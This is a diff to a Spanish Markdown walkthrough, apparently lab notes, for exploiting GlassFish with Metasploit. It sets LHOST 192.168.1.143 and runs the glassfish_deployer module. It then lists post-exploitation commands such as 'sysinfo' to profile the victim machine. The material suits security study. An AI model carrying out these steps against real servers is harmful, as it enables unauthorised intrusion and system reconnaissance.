@@ -1,3 +1,7 @@
+# Glassfish
+
+## Pasos a seguir
+
 Abrimos primero 'msfconsole'
 
 Seleccionamos el módulo con 'use exploit/mult/http/glassfish_deployer'
@@ -15,7 +19,7 @@ set LHOST 192.168.1.143
 
 Ejecutamos el exploit con: 'exploit'
 
-Una vez dentro podemos ejecutar:
+## Una vez dentro podemos ejecutar
 
 -sysinfo: Para obtener información sobre el sistema operativo de la máquina víctima.
 
